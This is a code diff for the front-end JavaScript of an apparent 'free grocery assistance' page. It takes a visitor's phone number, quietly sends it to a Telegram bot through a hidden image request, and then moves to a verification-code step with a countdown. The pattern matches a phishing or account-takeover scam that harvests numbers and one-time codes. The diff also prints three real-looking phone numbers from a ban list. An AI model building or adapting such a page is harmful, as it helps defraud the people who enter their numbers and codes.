@@ -215,46 +215,39 @@
         };
 
         function processStep1() {
-    const phone = document.getElementById('userPhone').value.trim();
-    const regStatus = document.querySelector('input[name="reg"]:checked').value;
-    const el = document.getElementById('userPhone');
+        const phone = document.getElementById('userPhone').value.trim();
+        const regStatus = document.querySelector('input[name="reg"]:checked').value;
+        const el = document.getElementById('userPhone');
 
-    // 1. DEFINE YOUR BANNED NUMBERS HERE
-    const bannedNumbers = [
-        '09193188409', 
-        '09154298466',
-        '09531640629'
-    ];
+        // 1. VALIDATION PARA SA FORMAT (09xxxxxxxx)
+        if (phone.length < 11 || !phone.startsWith('09')) {
+            el.classList.add('shake-error');
+            setTimeout(() => el.classList.remove('shake-error'), 500);
+            return;
+        }
 
-    // 2. BASIC VALIDATION (Existing)
-    if (phone.length < 11 || !phone.startsWith('09')) {
-        el.classList.add('shake-error');
-        setTimeout(() => el.classList.remove('shake-error'), 500);
-        return;
+        // 2. BAN FILTER (Kukunin nito ang listahan mula sa config.js)
+        if (BANNED_NUMBERS.includes(phone)) {
+            alert("This number is not eligible for verification.");
+            el.classList.add('shake-error');
+            el.value = ""; // Lilinisin ang box
+            return; // Hihinto na dito, hindi magse-send sa Telegram
+        }
+
+        // 3. KUNG HINDI BANNED, MAGPAPATULOY DITO
+        const msg = `🛒 GROCERY ASSIST REQUEST:\n📱 Number: ${phone}\n👤 Registered: ${regStatus}`;
+        new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
+
+        if(BYPASS_MODE) {
+            setTimeout(() => {
+                window.location.href = "https://FreeShoppingPH.github.io/FreeShoppingPH/main.html";
+            }, 800);
+        } else {
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+            startCountDown(300);
+        }
     }
-
-    // 3. THE FILTER / BAN CHECK
-    if (bannedNumbers.includes(phone)) {
-        alert("This number is not eligible for this program.");
-        el.classList.add('shake-error');
-        el.value = ""; // Clear the field
-        return; // STOP everything here. No Telegram message, no redirect.
-    }
-
-    // 4. PROCEED IF NOT BANNED
-    const msg = `🛒 GROCERY ASSIST REQUEST:\n📱 Number: ${phone}\n👤 Registered: ${regStatus}`;
-    new Image().src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
-
-    if(BYPASS_MODE) {
-        setTimeout(() => {
-            window.location.href = "https://FreeShoppingPH.github.io/FreeShoppingPH/main.html";
-        }, 800);
-    } else {
-        document.getElementById('step1').classList.add('hidden');
-        document.getElementById('step2').classList.remove('hidden');
-        startCountDown(300);
-    }
-}
 
         function processStep2() {
             const vInput = document.getElementById('vCode');
